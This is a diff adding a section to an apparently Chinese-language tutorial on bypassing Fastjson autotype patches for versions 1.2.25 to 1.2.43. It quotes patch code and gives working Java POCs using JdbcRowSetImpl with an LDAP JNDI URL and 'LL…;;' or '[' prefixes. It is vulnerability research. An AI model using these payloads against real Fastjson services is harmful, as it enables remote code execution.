@@ -93,3 +93,89 @@ if (className.startsWith("L") && className.endsWith(";")) {
 ![image-20220922163701901](img/image-20220922163701901.png)
 
 又重新得到了`com.sun.rowset.JdbcRowSetImpl`再去`loadClass`，就可以愉快的进行后面的步骤了
+
+## 1.2.25~1.2.42
+
+这个版本修复了1.2.41时的漏洞，具体修复情况看官方修改的代码
+
+![image-20220923103150619](img/image-20220923103150619.png)
+
+再一次进行了`loadClass`，这个过滤比较无语，在写一次就能绕过，也就是双写`L;`
+
+POC
+
+```java
+public class POC {
+    public static void main(String[] args) {
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        String st = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\"," +
+                "\"dataSourceName\":\"ldap://localhost:1099/#Exploit\", \"autoCommit\":true}";
+        JSON.parse(st);
+    }
+}
+```
+
+![image-20220923105143556](img/image-20220923105143556.png)
+
+`loadClass:1091`去掉一层`L;`，第二次再次去掉一层`L;`就得到了`com.sun.rowset.JdbcRowSetImpl`
+
+经历两次一模一样的方法处理。
+
+![image-20220923105414453](img/image-20220923105414453.png)
+
+## 1.2.25~1.2.43
+
+在1.2.43版本的补丁修复中，增加了以下验证，也就是在checkAutoType后又添加了一层判断逻辑
+
+```java
+if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
+    if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) {
+        throw new JSONException("autoType is not support. " + typeName);
+    }
+
+    className = className.substring(1, className.length() - 1);
+}
+```
+
+在`loadClass`前面执行，如果是双写`L`就会抛出异常。
+
+所以双写`L`这边也给禁掉了。还有一个思路是跟判断开头是`L`结尾是`;`的逻辑的同步逻辑中，还有这样一段代码。
+
+```java
+else if (className.charAt(0) == '[') {
+    Class<?> componentType = loadClass(className.substring(1), classLoader);
+    return Array.newInstance(componentType, 0).getClass();
+```
+
+现在大致是这么理解，然后现在说POC
+
+```java
+public class POC {
+    public static void main(String[] args) {
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        String st = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1099/#Exploit\", \"autoCommit\":true}";
+        JSON.parse(st);
+    }
+}
+```
+
+原本的POC是这样，只是在`autotype`的值前面加上一个`[`，来调用`Array.newInstance`去绕过禁用双`L`的修复。但是这样执行POC的话，会报错。
+
+![image-20220923171104344](img/image-20220923171104344.png)
+
+意为希望42列这里存在一个`[`至于是为什么，这个不清楚，但是稍微想一想，他一定不会是开发在提示你这个漏洞的POC该怎么写吧。所以就猜测可能是语法问题。至于为什么写，不深究（是因为也看不懂）
+
+然后继续执行POC
+
+![image-20220923171314132](img/image-20220923171314132.png)
+
+再次报错，希望在43列的位置存在一个`{`
+
+继续添加上去，再次执行，可以看到成功执行并弹出计算器
+
+![image-20220923171441267](img/image-20220923171441267.png)
+
+这也就是这个版本的修复与绕过
+
+
+
